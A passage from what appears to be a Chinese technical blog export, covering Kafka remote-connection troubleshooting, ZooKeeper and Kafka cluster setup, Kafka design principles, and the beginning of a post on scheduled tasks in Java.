    <url>/2017/06/14/kafka%E4%B8%8D%E8%83%BD%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>在已安装好的kafka集群进行远程连接时，有如下报错信息</p>
<blockquote>
<p> ERROR Error when sending message to topic test with key: null, value: 6 bytes with error: (org.apache.kafka.clients.producer.internals.ErrorLoggingCallback)</p>
</blockquote>
<p>  在kafka本地服务器上进行连接，生产者与消费者皆可运行。</p>
<p><strong>解决办法：</strong> </p>
<p>更改配置文件</p>
<blockquote>
<p>vi config/server.properties</p>
</blockquote>
<p># The address the socket server listens on. It will get the value returned from<br># java.net.InetAddress.getCanonicalHostName() if not configured.<br>#   FORMAT:<br>#     listeners = listener_name://host_name:port<br>#   EXAMPLE:<br>#     listeners = PLAINTEXT://your.host.name:9092<br>listeners=PLAINTEXT://192.168.56.60:9092</p>
<p>listeners监听注释打开并指定当前机器IP与端口 kafka具体搭建参见文章  <a href="http://onwise.xyz/2017/06/13/kafka%e4%b8%bb%e8%a6%81%e9%85%8d%e7%bd%ae%e5%8f%8a%e9%9b%86%e7%be%a4%e6%90%ad%e5%bb%ba/">kafka主要配置及集群搭建</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA提高</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>kafka主要配置及集群搭建</title>
    <url>/2017/06/13/kafka%E4%B8%BB%E8%A6%81%E9%85%8D%E7%BD%AE%E5%8F%8A%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>一、主要配置 1、Broker配置 <img src="http://img.blog.csdn.net/20160826122948868" alt="这里写图片描述"> 2.Consumer主要配置 <img src="http://img.blog.csdn.net/20160826122959962" alt="这里写图片描述"> 3.Producer主要配置 <img src="http://img.blog.csdn.net/20160826123017944" alt="这里写图片描述"> 以上是关于kafka一些基础说明，在其中我们知道如果要kafka正常运行，必须配置zookeeper，否则无论是kafka集群还是客户端的生存者和消费者都无法正常的工作的，以下是对zookeeper进行一些简单的介绍： 二、zookeeper集群 zookeeper是一个为分布式应用提供一致性服务的软件，它是开源的Hadoop项目的一个子项目，并根据google发表的一篇论文来实现的。zookeeper为分布式系统提供了高笑且易于使用的协同服务，它可以为分布式应用提供相当多的服务，诸如统一命名服务，配置管理，状态同步和组服务等。zookeeper接口简单，我们不必过多地纠结在分布式系统编程难于处理的同步和一致性问题上，你可以使用zookeeper提供的现成(off-the-shelf)服务来实现来实现分布式系统额配置管理，组管理，Leader选举等功能。 zookeeper集群的安装,准备三台服务器server1:192.168.0.1,server2:192.168.0.2, server3:192.168.0.3. 1)下载zookeeper 到<a href="http://zookeeper.apache.org/releases.html">http://zookeeper.apache.org/releases.html</a>去下载最新版本Zookeeper-3.4.5的安装包zookeeper-3.4.5.tar.gz.将文件保存server1的<del>目录下 2)安装zookeeper 先在服务器server分别执行a-c步骤 a)解压 tar -zxvf zookeeper-3.4.5.tar.gz 解压完成后在目录</del>下会发现多出一个目录zookeeper-3.4.5,重新命令为zookeeper b）配置 将conf/zoo_sample.cfg拷贝一份命名为zoo.cfg，也放在conf目录下。然后按照如下值修改其中的配置：</p>
<p># The number of milliseconds of each tick<br>tickTime=2000<br># The number of ticks that the initial<br># synchronization phase can take<br>initLimit=10<br># The number of ticks that can pass between<br># sending a request and getting an acknowledgement<br>syncLimit=5<br># the directory where the snapshot is stored.<br># do not use /tmp for storage, /tmp here is just<br># example sakes.<br>dataDir=/home/wwb/zookeeper /data<br>dataLogDir=/home/wwb/zookeeper/logs<br># the port at which the clients will connect<br>clientPort=2181<br>#<br># Be sure to read the maintenance section of the<br># administrator guide before turning on autopurge.<br>#<a href="http://zookeeper.apache.org/doc/">http://zookeeper.apache.org/doc/</a> … html#sc_maintenance<br>#<br># The number of snapshots to retain in dataDir<br>#autopurge.snapRetainCount=3<br># Purge task interval in hours<br># Set to “0” to disable auto purge feature<br>#autopurge.purgeInterval=1<br>server.1=192.168.0.1:3888:4888<br>server.2=192.168.0.2:3888:4888<br>server.3=192.168.0.3:3888:4888</p>
<p>tickTime：这个时间是作为 Zookeeper 服务器之间或客户端与服务器之间维持心跳的时间间隔，也就是每个 tickTime 时间就会发送一个心跳。 dataDir：顾名思义就是 Zookeeper 保存数据的目录，默认情况下，Zookeeper 将写数据的日志文件也保存在这个目录里。 clientPort：这个端口就是客户端连接 Zookeeper 服务器的端口，Zookeeper 会监听这个端口，接受客户端的访问请求。 initLimit：这个配置项是用来配置 Zookeeper 接受客户端（这里所说的客户端不是用户连接 Zookeeper 服务器的客户端，而是 Zookeeper 服务器集群中连接到 Leader 的 Follower 服务器）初始化连接时最长能忍受多少个心跳时间间隔数。当已经超过 5个心跳的时间（也就是 tickTime）长度后 Zookeeper 服务器还没有收到客户端的返回信息，那么表明这个客户端连接失败。总的时间长度就是 5*2000=10 秒 syncLimit：这个配置项标识 Leader 与Follower 之间发送消息，请求和应答时间长度，最长不能超过多少个 tickTime 的时间长度，总的时间长度就是2*2000=4 秒 server.A=B：C：D：其中 A 是一个数字，表示这个是第几号服务器；B 是这个服务器的 ip 地址；C 表示的是这个服务器与集群中的 Leader 服务器交换信息的端口；D 表示的是万一集群中的 Leader 服务器挂了，需要一个端口来重新进行选举，选出一个新的 Leader，而这个端口就是用来执行选举时服务器相互通信的端口。如果是伪集群的配置方式，由于 B 都是一样，所以不同的 Zookeeper 实例通信端口号不能一样，所以要给它们分配不同的端口号 注意:dataDir,dataLogDir中的wwb是当前登录用户名，data，logs目录开始是不存在，需要使用mkdir命令创建相应的目录。并且在该目录下创建文件myid,serve1,server2,server3该文件内容分别为1,2,3。 针对服务器server2,server3可以将server1复制到相应的目录，不过需要注意dataDir,dataLogDir目录,并且文件myid内容分别为2,3 3)依次启动server1，server2,server3的zookeeper. /home/wwb/zookeeper/bin/zkServer.sh start,出现类似以下内容 JMX enabled by default Using config: /home/wwb/zookeeper/bin/../conf/zoo.cfg Starting zookeeper … STARTED 4) 测试zookeeper是否正常工作，在server1上执行以下命令 /home/wwb/zookeeper/bin/zkCli.sh -server192.168.0.2:2181,出现类似以下内容 JLine support is enabled 2013-11-27 19:59:40,560 - INFO [main-SendThread(localhost.localdomain:2181):ClientCnxn$SendThread@736]- Session establishmentcomplete on server localhost.localdomain/127.0.0.1:2181, sessionid = 0x1429cdb49220000, negotiatedtimeout = 30000 WATCHER:: WatchedEvent state:SyncConnected type:None path:null [zk: 127.0.0.1:2181(CONNECTED) 0] [root@localhostzookeeper2]# 即代表集群构建成功了,如果出现错误那应该是第三部时没有启动好集群， 运行，先利用 ps aux | grep zookeeper查看是否有相应的进程的，没有话，说明集群启动出现问题，可以在每个服务器上使用 ./home/wwb/zookeeper/bin/zkServer.sh stop。再依次使用./home/wwb/zookeeper/binzkServer.sh start，这时在执行4一般是没有问题，如果还是有问题，那么先stop再到bin的上级目录执行./bin/zkServer.shstart试试。 注意：zookeeper集群时，zookeeper要求半数以上的机器可用，zookeeper才能提供服务。 三、kafka集群 (利用上面server1,server2,server3,下面以server1为实例) 1)下载kafka0.8(<a href="http://kafka.apache.org/downloads.html">http://kafka.apache.org/downloads.html</a>),保存到服务器/home/wwb目录下kafka-0.8.0-beta1-src.tgz(kafka_2.8.0-0.8.0-beta1.tgz) 2)解压 tar -zxvf kafka-0.8.0-beta1-src.tgz,产生文件夹kafka-0.8.0-beta1-src更改为kafka01 3)配置 修改kafka01/config/server.properties,其中broker.id,log.dirs,zookeeper.connect必须根据实际情况进行修改，其他项根据需要自行斟酌。大致如下：</p>
<p>broker.id=1<br>port=9091<br>num.network.threads=2<br>num.io.threads=2<br>socket.send.buffer.bytes=1048576<br>socket.receive.buffer.bytes=1048576<br>socket.request.max.bytes=104857600<br>log.dir=./logs<br>num.partitions=2<br>log.flush.interval.messages=10000<br>log.flush.interval.ms=1000<br>log.retention.hours=168<br>#log.retention.bytes=1073741824<br>log.segment.bytes=536870912<br>num.replica.fetchers=2<br>log.cleanup.interval.mins=10<br>zookeeper.connect=192.168.0.1:2181,192.168.0.2:2182,192.168.0.3:2183<br>zookeeper.connection.timeout.ms=1000000<br>kafka.metrics.polling.interval.secs=5<br>kafka.metrics.reporters=kafka.metrics.KafkaCSVMetricsReporter<br>kafka.csv.metrics.dir=/tmp/kafka_metrics<br>kafka.csv.metrics.reporter.enabled=false</p>
<p>  4）初始化因为kafka用scala语言编写，因此运行kafka需要首先准备scala相关环境。</p>
<blockquote>
<p>cd kafka01 ./sbt update ./sbt package ./sbt assembly-package-dependency 在第二个命令时可能需要一定时间，由于要下载更新一些依赖包。所以请大家 耐心点。</p>
</blockquote>
<ol start="5">
<li>启动kafka01</li>
</ol>
<blockquote>
<p>JMX_PORT=9997 bin/kafka-server-start.sh config/server.properties &amp; a)kafka02操作步骤与kafka01雷同，不同的地方如下 修改kafka02/config/server.properties broker.id=2 port=9092 ##其他配置和kafka-0保持一致 启动kafka02 JMX_PORT=9998 bin/kafka-server-start.shconfig/server.properties &amp; b)kafka03操作步骤与kafka01雷同，不同的地方如下 修改kafka03/config/server.properties broker.id=3 port=9093 ##其他配置和kafka-0保持一致 启动kafka02 JMX_PORT=9999 bin/kafka-server-start.shconfig/server.properties &amp;</p>
</blockquote>
<p>6)创建Topic(包含一个分区，三个副本)</p>
<blockquote>
<p>bin/kafka-create-topic.sh–zookeeper 192.168.0.1:2181 –replica 3 –partition 1 –topicmy-replicated-topic</p>
</blockquote>
<p>7)查看topic情况</p>
<blockquote>
<p>bin/kafka-list-top.sh –zookeeper 192.168.0.1:2181 topic: my-replicated-topic partition: 0 leader: 1 replicas: 1,2,0 isr: 1,2,0</p>
</blockquote>
<p>8)创建发送者</p>
<blockquote>
<p>bin/kafka-console-producer.sh–broker-list 192.168.0.1:9091 –topic my-replicated-topic my test message1 my test message2</p>
</blockquote>
<p>9)创建消费者</p>
<blockquote>
<p>bin/kafka-console-consumer.sh –zookeeper127.0.0.1:2181 –from-beginning –topic my-replicated-topic … my test message1 my test message2 ^C</p>
</blockquote>
<p>10)杀掉server1上的broker</p>
<blockquote>
<p>pkill -9 -f config/server.properties</p>
</blockquote>
<p>11)查看topic</p>
<blockquote>
<p>bin/kafka-list-top.sh –zookeeper192.168.0.1:2181 topic: my-replicated-topic partition: 0 leader: 1 replicas: 1,2,0 isr: 1,2,0 发现topic还正常的存在</p>
</blockquote>
<p>12)创建消费者，看是否能查询到消息</p>
<blockquote>
<p>bin/kafka-console-consumer.sh –zookeeper192.168.0.1:2181 –from-beginning –topic my-replicated-topic … my test message 1 my test message 2</p>
</blockquote>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA提高</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>kafka入门：简介、使用场景、设计原理</title>
    <url>/2017/06/13/kafka%E5%85%A5%E9%97%A8%EF%BC%9A%E7%AE%80%E4%BB%8B%E3%80%81%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E3%80%81%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h3 id="问题导读："><a href="#问题导读：" class="headerlink" title="问题导读："></a>问题导读：</h3><p><strong>1.zookeeper在kafka的作用是什么？</strong></p>
<p><strong>2.kafka中几乎不允许对消息进行“随机读写”的原因是什么？</strong></p>
<p><strong>3.kafka集群consumer和producer状态信息是如何保存的？</strong></p>
<p><strong>4.partitions设计的目的的根本原因是什么？</strong></p>
<h3 id="一、入门"><a href="#一、入门" class="headerlink" title="一、入门"></a>一、入门</h3><p>** 1. 简介 **</p>
<p>  Kafka is a distributed,partitioned,replicated commit logservice。它提供了类似于JMS的特性，但是在设计实现上完全不同，此外它并不是JMS规范的实现。kafka对消息保存时根据Topic进行归类，发送消息者成为Producer,消息接受者成为Consumer,此外kafka集群有多个kafka实例组成，每个实例(server)成为broker。无论是kafka集群，还是producer和consumer都依赖于zookeeper来保证系统可用性集群保存一些meta信息。</p>
<p><img src="http://www.aboutyun.com/data/attachment/forum/201409/28/143553z1pif7uok8ezr61u.png"></p>
<p>** 2. Topics/logs **</p>
<p>    一个Topic可以认为是一类消息，每个topic将被分成多个partition(区),每个partition在存储层面是append log文件。任何发布到此partition的消息都会被直接追加到log文件的尾部，每条消息在文件中的位置称为offset（偏移量），offset为一个long型数字，它是唯一标记一条消息。它唯一的标记一条消息。kafka并没有提供其他额外的索引机制来存储offset，因为在kafka中几乎不允许对消息进行“随机读写”。</p>
<p> </p>
<p><img src="http://www.aboutyun.com/data/attachment/forum/201409/28/143553t3nhnsbri6s6nfh5.png"></p>
<p> </p>
<p>    kafka和JMS（Java Message Service）实现(activeMQ)不同的是:即使消息被消费,消息仍然不会被立即删除.日志文件将会根据broker中的配置要求,保留一定的时间之后删除;比如log文件保留2天,那么两天后,文件会被清除,无论其中的消息是否被消费.kafka通过这种简单的手段,来释放磁盘空间,以及减少消息消费之后对文件内容改动的磁盘IO开支.</p>
<p>    对于consumer而言,它需要保存消费消息的offset,对于offset的保存和使用,有consumer来控制;当consumer正常消费消息时,offset将会”线性”的向前驱动,即消息将依次顺序被消费.事实上consumer可以使用任意顺序消费消息,它只需要将offset重置为任意值..(offset将会保存在zookeeper中,参见下文)</p>
<p>    kafka集群几乎不需要维护任何consumer和producer状态信息,这些信息有zookeeper保存;因此producer和consumer的客户端实现非常轻量级,它们可以随意离开,而不会对集群造成额外的影响.</p>
<p>    partitions的设计目的有多个.最根本原因是kafka基于文件存储.通过分区,可以将日志内容分散到多个server上,来避免文件尺寸达到单机磁盘的上限,每个partiton都会被当前server(kafka实例)保存;可以将一个topic切分多任意多个partitions,来消息保存/消费的效率.此外越多的partitions意味着可以容纳更多的consumer,有效提升并发消费的能力.(具体原理参见下文).</p>
<p>** 3. Distribution **</p>
<p>    一个Topic的多个partitions,被分布在kafka集群中的多个server上;每个server(kafka实例)负责partitions中消息的读写操作;此外kafka还可以配置partitions需要备份的个数(replicas),每个partition将会被备份到多台机器上,以提高可用性.</p>
<p>    基于replicated方案,那么就意味着需要对多个备份进行调度;每个partition都有一个server为”leader”;leader负责所有的读写操作,如果leader失效,那么将会有其他follower来接管(成为新的leader);follower只是单调的和leader跟进,同步消息即可..由此可见作为leader的server承载了全部的请求压力,因此从集群的整体考虑,有多少个partitions就意味着有多少个”leader”,kafka会将”leader”均衡的分散在每个实例上,来确保整体的性能稳定.</p>
<p>    <strong>Producers</strong></p>
<p>    Producer将消息发布到指定的Topic中,同时Producer也能决定将此消息归属于哪个partition;比如基于”round-robin”方式或者通过其他的一些算法等.</p>
<p>    <strong>Consumers</strong></p>
<p>    本质上kafka只支持Topic.每个consumer属于一个consumer group;反过来说,每个group中可以有多个consumer.发送到Topic的消息,只会被订阅此Topic的每个group中的一个consumer消费.</p>
<p>    如果所有的consumer都具有相同的group,这种情况和queue模式很像;消息将会在consumers之间负载均衡.</p>
<p>    如果所有的consumer都具有不同的group,那这就是”发布-订阅”;消息将会广播给所有的消费者.</p>
<p>    在kafka中,一个partition中的消息只会被group中的一个consumer消费;每个group中consumer消息消费互相独立;我们可以认为一个group是一个”订阅”者,一个Topic中的每个partions,只会被一个”订阅者”中的一个consumer消费,不过一个consumer可以消费多个partitions中的消息.kafka只能保证一个partition中的消息被某个consumer消费时,消息是顺序的.事实上,从Topic角度来说,消息仍不是有序的.</p>
<p>    kafka的设计原理决定,对于一个topic,同一个group中不能有多于partitions个数的consumer同时消费,否则将意味着某些consumer将无法得到消息.</p>
<p>    <strong>Guarantees</strong></p>
<p>    1) 发送到partitions中的消息将会按照它接收的顺序追加到日志中</p>
<p>    2) 对于消费者而言,它们消费消息的顺序和日志中消息顺序一致.</p>
<p>    3) 如果Topic的”replicationfactor”为N,那么允许N-1个kafka实例失效.</p>
<h3 id="二、使用场景"><a href="#二、使用场景" class="headerlink" title="二、使用场景"></a>二、使用场景</h3><p>**    1、Messaging   **</p>
<p>    对于一些常规的消息系统,kafka是个不错的选择;partitons/replication和容错,可以使kafka具有良好的扩展性和性能优势.不过到目前为止,我们应该很清楚认识到,kafka并没有提供JMS中的”事务性””消息传输担保(消息确认机制)””消息分组”等企业级特性;kafka只能使用作为”常规”的消息系统,在一定程度上,尚未确保消息的发送与接收绝对可靠(比如,消息重发,消息发送丢失等)</p>
<p>**    2、Websit activity tracking**</p>
<p>    kafka可以作为”网站活性跟踪”的最佳工具;可以将网页/用户操作等信息发送到kafka中.并实时监控,或者离线统计分析等</p>
<p> </p>
<p>**    3、Log Aggregation**</p>
<p>    kafka的特性决定它非常适合作为”日志收集中心”;application可以将操作日志”批量””异步”的发送到kafka集群中,而不是保存在本地或者DB中;kafka可以批量提交消息/压缩消息等,这对producer端而言,几乎感觉不到性能的开支.此时consumer端可以使hadoop等其他系统化的存储和分析系统.</p>
<p>    <strong>4、Metrics</strong> Kafka通常被用于可操作的监控数据。这包括从分布式应用程序来的聚合统计用来生产集中的运营数据提要。</p>
<h3 id="三、设计原理"><a href="#三、设计原理" class="headerlink" title="三、设计原理"></a>三、设计原理</h3><p>    kafka的设计初衷是希望作为一个统一的信息收集平台,能够实时的收集反馈信息,并需要能够支撑较大的数据量,且具备良好的容错能力.</p>
<p>**    1、持久性**</p>
<p>    kafka使用文件存储消息,这就直接决定kafka在性能上严重依赖文件系统的本身特性.且无论任何OS下,对文件系统本身的优化几乎没有可能.文件缓存/直接内存映射等是常用的手段.因为kafka是对日志文件进行append操作,因此磁盘检索的开支是较小的;同时为了减少磁盘写入的次数,broker会将消息暂时buffer起来,当消息的个数(或尺寸)达到一定阀值时,再flush到磁盘,这样减少了磁盘IO调用的次数.</p>
<p><strong>2、性能</strong></p>
<p>    需要考虑的影响性能点很多,除磁盘IO之外,我们还需要考虑网络IO,这直接关系到kafka的吞吐量问题.kafka并没有提供太多高超的技巧;对于producer端,可以将消息buffer起来,当消息的条数达到一定阀值时,批量发送给broker;对于consumer端也是一样,批量fetch多条消息.不过消息量的大小可以通过配置文件来指定.对于kafka broker端,似乎有个sendfile系统调用可以潜在的提升网络IO的性能:将文件的数据映射到系统内存中,socket直接读取相应的内存区域即可,而无需进程再次copy和交换. 其实对于producer/consumer/broker三者而言,CPU的开支应该都不大,因此启用消息压缩机制是一个良好的策略;压缩需要消耗少量的CPU资源,不过对于kafka而言,网络IO更应该需要考虑.可以将任何在网络上传输的消息都经过压缩.kafka支持gzip/snappy等多种压缩方式.</p>
<p>**    3、生产者**</p>
<p>    负载均衡: producer将会和Topic下所有partition leader保持socket连接;消息由producer直接通过socket发送到broker,中间不会经过任何”路由层”.事实上,消息被路由到哪个partition上,有producer客户端决定.比如可以采用”random””key-hash””轮询”等,如果一个topic中有多个partitions,那么在producer端实现”消息均衡分发”是必要的.</p>
<p>    其中partition leader的位置(host:port)注册在zookeeper中,producer作为zookeeper client,已经注册了watch用来监听partition leader的变更事件.</p>
<p>    异步发送：将多条消息暂且在客户端buffer起来，并将他们批量的发送到broker，小数据IO太多，会拖慢整体的网络延迟，批量延迟发送事实上提升了网络效率。不过这也有一定的隐患，比如说当producer失效时，那些尚未发送的消息将会丢失。</p>
<p> </p>
<p>**    4、消费者**</p>
<p>    consumer端向broker发送”fetch”请求,并告知其获取消息的offset;此后consumer将会获得一定条数的消息;consumer端也可以重置offset来重新消费消息.</p>
<p>    在JMS实现中,Topic模型基于push方式,即broker将消息推送给consumer端.不过在kafka中,采用了pull方式,即consumer在和broker建立连接之后,主动去pull(或者说fetch)消息;这中模式有些优点,首先consumer端可以根据自己的消费能力适时的去fetch消息并处理,且可以控制消息消费的进度(offset);此外,消费者可以良好的控制消息消费的数量,batch fetch.</p>
<p>    其他JMS实现,消息消费的位置是有prodiver保留,以便避免重复发送消息或者将没有消费成功的消息重发等,同时还要控制消息的状态.这就要求JMS broker需要太多额外的工作.在kafka中,partition中的消息只有一个consumer在消费,且不存在消息状态的控制,也没有复杂的消息确认机制,可见kafka broker端是相当轻量级的.当消息被consumer接收之后,consumer可以在本地保存最后消息的offset,并间歇性的向zookeeper注册offset.由此可见,consumer客户端也很轻量级.</p>
<p><img src="http://www.aboutyun.com/data/attachment/forum/201409/28/143554ypkap9sc5cu2j993.png"></p>
<p> </p>
<p>**    5、消息传送机制**</p>
<p>    对于JMS实现,消息传输担保非常直接:有且只有一次(exactly once).在kafka中稍有不同:</p>
<p>    1) at most once: 最多一次,这个和JMS中”非持久化”消息类似.发送一次,无论成败,将不会重发.</p>
<p>    2) at least once: 消息至少发送一次,如果消息未能接受成功,可能会重发,直到接收成功.</p>
<p>    3) exactly once: 消息只会发送一次.</p>
<p>    at most once: 消费者fetch消息,然后保存offset,然后处理消息;当client保存offset之后,但是在消息处理过程中出现了异常,导致部分消息未能继续处理.那么此后”未处理”的消息将不能被fetch到,这就是”at most once”.</p>
<p>    at least once: 消费者fetch消息,然后处理消息,然后保存offset.如果消息处理成功之后,但是在保存offset阶段zookeeper异常导致保存操作未能执行成功,这就导致接下来再次fetch时可能获得上次已经处理过的消息,这就是”at least once”，原因offset没有及时的提交给zookeeper，zookeeper恢复正常还是之前offset状态.</p>
<p>    exactly once: kafka中并没有严格的去实现(基于2阶段提交,事务),我们认为这种策略在kafka中是没有必要的.</p>
<p>    通常情况下”at-least-once”是我们搜选.(相比at most once而言,重复接收数据总比丢失数据要好).</p>
<p>**    6、复制备份**</p>
<p>    kafka将每个partition数据复制到多个server上,任何一个partition有一个leader和多个follower(可以没有);备份的个数可以通过broker配置文件来设定.leader处理所有的read-write请求,follower需要和leader保持同步.Follower和consumer一样,消费消息并保存在本地日志中;leader负责跟踪所有的follower状态,如果follower”落后”太多或者失效,leader将会把它从replicas同步列表中删除.当所有的follower都将一条消息保存成功,此消息才被认为是”committed”,那么此时consumer才能消费它.即使只有一个replicas实例存活,仍然可以保证消息的正常发送和接收,只要zookeeper集群存活即可.(不同于其他分布式存储,比如hbase需要”多数派”存活才行)</p>
<p>    当leader失效时,需在followers中选取出新的leader,可能此时follower落后于leader,因此需要选择一个”up-to-date”的follower.选择follower时需要兼顾一个问题,就是新leaderserver上所已经承载的partition leader的个数,如果一个server上有过多的partition leader,意味着此server将承受着更多的IO压力.在选举新leader,需要考虑到”负载均衡”.</p>
<p>**    7.日志**</p>
<p>    如果一个topic的名称为”my_topic”,它有2个partitions,那么日志将会保存在my_topic_0和my_topic_1两个目录中;日志文件中保存了一序列”log entries”(日志条目),每个log entry格式为”4个字节的数字N表示消息的长度” + “N个字节的消息内容”;每个日志都有一个offset来唯一的标记一条消息,offset的值为8个字节的数字,表示此消息在此partition中所处的起始位置..每个partition在物理存储层面,有多个log file组成(称为segment).segmentfile的命名为”最小offset”.kafka.例如”00000000000.kafka”;其中”最小offset”表示此segment中起始消息的offset.</p>
<p><img src="http://www.aboutyun.com/data/attachment/forum/201409/28/143556yde5xpqz2bbemz6b.png"></p>
<p>    其中每个partiton中所持有的segments列表信息会存储在zookeeper中.</p>
<p>    当segment文件尺寸达到一定阀值时(可以通过配置文件设定,默认1G),将会创建一个新的文件;当buffer中消息的条数达到阀值时将会触发日志信息flush到日志文件中,同时如果”距离最近一次flush的时间差”达到阀值时,也会触发flush到日志文件.如果broker失效,极有可能会丢失那些尚未flush到文件的消息.因为server意外实现,仍然会导致log文件格式的破坏(文件尾部),那么就要求当server启东是需要检测最后一个segment的文件结构是否合法并进行必要的修复.</p>
<p>    获取消息时,需要指定offset和最大chunk尺寸,offset用来表示消息的起始位置,chunk size用来表示最大获取消息的总长度(间接的表示消息的条数).根据offset,可以找到此消息所在segment文件,然后根据segment的最小offset取差值,得到它在file中的相对位置,直接读取输出即可.</p>
<p>    日志文件的删除策略非常简单:启动一个后台线程定期扫描log file列表,把保存时间超过阀值的文件直接删除(根据文件的创建时间).为了避免删除文件时仍然有read操作(consumer消费),采取copy-on-write方式.</p>
<p>**    8、分配**</p>
<p>    kafka使用zookeeper来存储一些meta信息,并使用了zookeeper watch机制来发现meta信息的变更并作出相应的动作(比如consumer失效,触发负载均衡等)</p>
<p>    1) Broker node registry: 当一个kafkabroker启动后,首先会向zookeeper注册自己的节点信息(临时znode),同时当broker和zookeeper断开连接时,此znode也会被删除.</p>
<p>    格式: /broker/ids/[0…N]   –&gt;host:port;其中[0..N]表示broker id,每个broker的配置文件中都需要指定一个数字类型的id(全局不可重复),znode的值为此broker的host:port信息.</p>
<p>    2) Broker Topic Registry: 当一个broker启动时,会向zookeeper注册自己持有的topic和partitions信息,仍然是一个临时znode.</p>
<p>    格式: /broker/topics/[topic]/[0…N]  其中[0..N]表示partition索引号.</p>
<p>    3) Consumer and Consumer group: 每个consumer客户端被创建时,会向zookeeper注册自己的信息;此作用主要是为了”负载均衡”.</p>
<p>    一个group中的多个consumer可以交错的消费一个topic的所有partitions;简而言之,保证此topic的所有partitions都能被此group所消费,且消费时为了性能考虑,让partition相对均衡的分散到每个consumer上.</p>
<p>    4) Consumer id Registry: 每个consumer都有一个唯一的ID(host:uuid,可以通过配置文件指定,也可以由系统生成),此id用来标记消费者信息.</p>
<p>    格式:/consumers/[group_id]/ids/[consumer_id]</p>
<p>    仍然是一个临时的znode,此节点的值为{“topic_name”:#streams…},即表示此consumer目前所消费的topic + partitions列表.</p>
<p>    5) Consumer offset Tracking: 用来跟踪每个consumer目前所消费的partition中最大的offset.</p>
<p>    格式:/consumers/[group_id]/offsets/[topic]/[broker_id-partition_id]–&gt;offset_value</p>
<p>    此znode为持久节点,可以看出offset跟group_id有关,以表明当group中一个消费者失效,其他consumer可以继续消费.</p>
<p>    6) Partition Owner registry: 用来标记partition被哪个consumer消费.临时znode</p>
<p>    格式:/consumers/[group_id]/owners/[topic]/[broker_id-partition_id]–&gt;consumer_node_id当consumer启动时,所触发的操作:</p>
<p>    A) 首先进行”Consumer id Registry”;</p>
<p>    B) 然后在”Consumer id Registry”节点下注册一个watch用来监听当前group中其他consumer的”leave”和”join”;只要此znode path下节点列表变更,都会触发此group下consumer的负载均衡.(比如一个consumer失效,那么其他consumer接管partitions).</p>
<p>    C) 在”Broker id registry”节点下,注册一个watch用来监听broker的存活情况;如果broker列表变更,将会触发所有的groups下的consumer重新balance.</p>
<p><img src="http://www.aboutyun.com/data/attachment/forum/201409/28/143556e3ix3im8dm7uipm0.png"></p>
<p>    1) Producer端使用zookeeper用来”发现”broker列表,以及和Topic下每个partition leader建立socket连接并发送消息.</p>
<p>    2) Broker端使用zookeeper用来注册broker信息,已经监测partitionleader存活性.</p>
<p>    3) Consumer端使用zookeeper用来注册consumer信息,其中包括consumer消费的partition列表等,同时也用来发现broker列表,并和partition leader建立socket连接,并获取消息.</p>
]]></content>
      <categories>
        <category>JAVA</category>
        <category>JAVA提高</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>Java实现定时任务的三种方法</title>
    <url>/2017/06/12/java%E5%AE%9E%E7%8E%B0%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>在应用里经常都有用到在后台跑定时任务的需求。举个例子，比如需要在服务后台跑一个定时任务来进行垃圾回收（译者注：个人觉得用定时任务来跑垃圾回收不是很好的例子，从译者接触到的项目来看，比较常见的是用定时任务来进行非实时计算，清除临时数据、文件等）。 在本文里，3种不同的实现方法：</p>
<ul>
<li>普通thread实现</li>
<li>TimerTask实现</li>
<li>ScheduledExecutorService实现</li>
</ul>
<p>   </p>
<h2 id="普通thread"><a href="#普通thread" class="headerlink" title="普通thread"></a>普通thread</h2><p>这是最常见的，创建一个thread，然后让它在while循环里一直运行着，通过sleep方法来达到定时任务的效果。这样可以快速简单的实现，代码如下：</p>
<p>public class Task1 {<br>public static void main(String[] args) {<br>  // run in a second<br>  final long timeInterval = 1000;<br>  Runnable runnable = new Runnable() {<br>  public void run() {<br>    while (true) {<br>      // ------- code for task to run<br>      System.out.println(“Hello !!”);<br>      // ------- ends here<br>      try {<br>       Thread.sleep(timeInterval);<br>      } catch (InterruptedException e) {<br>        e.printStackTrace();<br>      }<br>      }<br>    }<br>  };<br>  Thread thread = new Thread(runnable);<br>  thread.start();<br>  }<br>}</p>
<p> </p>
<h2 id="用Timer和TimerTask"><a href="#用Timer和TimerTask" class="headerlink" title="　用Timer和TimerTask"></a>　用Timer和TimerTask</h2><p>上面的实现是非常快速简便的，但它也缺少一些功能。 用Timer和TimerTask的话与上述方法相比有如下好处：</p>
<ul>
<li>当启动和去取消任务时可以控制</li>
<li>第一次执行任务时可以指定你想要的delay时间</li>
</ul>
<p>在实现时，Timer类可以调度任务，TimerTask则是通过在run()方法里实现具体任务。 Timer实例可以调度多任务，它是线程安全的。 当Timer的构造器被调用时，它创建了一个线程，这个线程可以用来调度任务。 下面是代码：</p>
<p>import java.util.Timer;<br>import java.util.TimerTask;<br>public class Task2 {<br>  public static void main(String[] args) {<br>    TimerTask task = new TimerTask() {<br>      @Override<br>      public void run() {<br>        // task to run goes here<br>        System.out.println(“Hello !!!”);<br>      }<br>    };<br>    Timer timer = new Timer();<br>    long delay = 0;<br>    long intevalPeriod = 1 * 1000;<br>    // schedules the task to be run in an interval<br>    timer.scheduleAtFixedRate(task, delay,<br>                                intevalPeriod);<br>  } // end of main<br>}</p>
<p> </p>
<p> </p>
<h2 id="ScheduledExecutorService"><a href="#ScheduledExecutorService" class="headerlink" title="　ScheduledExecutorService"></a>　ScheduledExecutorService</h2><p>ScheduledExecutorService是从Java SE 5的java.util.concurrent里，做为并发工具类被引进的，这是最理想的定时任务实现方式。 相比于上两个方法，它有以下好处：</p>
